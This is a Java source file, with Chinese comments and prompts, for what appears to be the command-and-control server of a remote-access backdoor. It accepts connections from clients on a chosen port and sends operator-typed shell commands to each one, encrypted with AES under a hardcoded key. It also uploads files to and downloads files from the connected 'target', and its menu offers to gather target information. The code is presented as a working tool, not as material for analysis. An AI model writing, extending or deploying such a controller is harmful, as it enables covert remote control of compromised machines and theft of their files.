package org.example;

import picocli.CommandLine;
import picocli.CommandLine.Option;

import javax.crypto.*;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.Base64;
import java.util.Scanner;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

@CommandLine.Command(name = "SocketServer", mixinStandardHelpOptions = true, version = "1.0")
public class SocketServer implements Runnable {

    @Option(names = {"-p", "--port"}, description = "Server port", required = true)
    private int port;

    static String key = "I72YPGxLFctx1GnG";

    public static void main(String[] args) {
        int exitCode = new CommandLine(new SocketServer()).execute(args);
        System.exit(exitCode);
    }

    @Override
    public void run() {
        try {
            ServerSocket serverSocket = new ServerSocket(port);
            System.out.println("服务器启动，等待客户端连接...");

            ExecutorService executorService = Executors.newCachedThreadPool();
            Scanner scanner = new Scanner(System.in);

            while (true) {
                Socket clientSocket = serverSocket.accept(); // 等待客户端连接
                executorService.execute(new ClientHandler(clientSocket, scanner));
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    // 定义处理客户端的线程
    static class ClientHandler implements Runnable {
        private final Socket clientSocket;
        private final Scanner scanner;

        public ClientHandler(Socket clientSocket, Scanner scanner) {
            this.clientSocket = clientSocket;
            this.scanner = scanner;
        }

        @Override
        public void run() {
            try {
                // 获取输入输出流
                OutputStream os = clientSocket.getOutputStream();
                DataOutputStream dos = new DataOutputStream(os);
                InputStream is = clientSocket.getInputStream();
                DataInputStream dis = new DataInputStream(is);
                // 循环接收用户输入并发送给客户端
                String ospath = dis.readUTF();
                System.out.println("上传命令    upload local-file src-file");
                System.out.println("获取目标信息 info");
                System.out.println("下载命令    download src-file local-file");
                System.out.println("请输入要发送的命令（输入'exit'退出）：");
                while (true) {
                    System.out.print(ospath + "> ");
                    String command = scanner.nextLine();
                    if ("exit".equalsIgnoreCase(command)) {
                        break;
                    }
                    else if (command.startsWith("upload")) {
                        String[] commandParts = command.split(" ");
                        if (commandParts.length == 3) {
                            String localFilePath = commandParts[1];
                            String targetFilePath = commandParts[2];
                            sendFile(localFilePath, targetFilePath, dos, dis);
                        } else {
                            System.out.println("无效的upload命令。");
                        }
                    }
                    else if (command.startsWith("download")) {
                        String[] commandParts = command.split(" ");
                        if (commandParts.length == 3) {
                            String targetFilePath = commandParts[1];
                            String localFilePath = commandParts[2];
                            downloadFile(targetFilePath, localFilePath, dos, dis);
                        } else {
                            System.out.println("无效的download命令。");
                        }
                    }
                    else {
                        dos.writeUTF(encrypt(command));
                        String response = dis.readUTF();
                        System.out.println("客户端响应：" + decrypt(response));
                    }
                }
                // 关闭资源
                dos.close();
                os.close();
                dis.close();
                is.close();
                clientSocket.close();
            } catch (IOException | NoSuchPaddingException | IllegalBlockSizeException | NoSuchAlgorithmException |
                     BadPaddingException | InvalidKeyException e) {
                e.printStackTrace();
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
        }
    }

    // 处理文件上传
    private static void sendFile(String localFilePath, String targetFilePath, DataOutputStream dos, DataInputStream dis) throws Exception {
        File file = new File(localFilePath);
        if (!file.exists()) {
            System.out.println("文件不存在！");
            return;
        }
        dos.writeUTF(encrypt("upload"));
        dos.writeUTF(encrypt(targetFilePath));

        long fileLength = file.length();
        dos.writeLong(fileLength);

        byte[] buffer = new byte[4096];
        try (FileInputStream fis = new FileInputStream(file)) {
            int bytesRead;
            while ((bytesRead = fis.read(buffer)) != -1) {
                dos.write(buffer, 0, bytesRead);
            }
        }

        String response = dis.readUTF();
        if ("upload_success".equals(decrypt(response))) {
            System.out.println("文件上传成功！");
        } else {
            System.out.println("文件上传失败！");
        }
    }
    private static void downloadFile(String targetFilePath, String localFilePath, DataOutputStream dos, DataInputStream dis) throws Exception {
        File file = new File(localFilePath);
        dos.writeUTF(encrypt("download"));
        dos.writeUTF(encrypt(targetFilePath));
        long fileLength = dis.readLong();
        try (FileOutputStream fos = new FileOutputStream(file)) {
            byte[] buffer = new byte[4096];
            long bytesReceived = 0;
            int bytesRead;
            while (bytesReceived < fileLength) {
                bytesRead = dis.read(buffer);
                fos.write(buffer, 0, bytesRead);
                bytesReceived += bytesRead;
            }
        }
        String response = dis.readUTF();
        if ("download_success".equals(decrypt(response))){
            System.out.println("文件下载成功！");
        }else {
            System.out.println("文件下载失败！");
        }

    }


    public static String encrypt(String cmd) throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException {
        SecretKeySpec secretKeySpec = new SecretKeySpec(key.getBytes(), "AES");
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.ENCRYPT_MODE, secretKeySpec);
        byte[] bytes = cipher.doFinal(cmd.getBytes());
        return Base64.getEncoder().encodeToString(bytes);
    }

    public static String decrypt(String encryptedData) throws Exception {
        SecretKeySpec secretKeySpec = new SecretKeySpec(key.getBytes(), "AES");
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.DECRYPT_MODE, secretKeySpec);
        byte[] original = cipher.doFinal(Base64.getDecoder().decode(encryptedData));
        return new String(original);
    }
}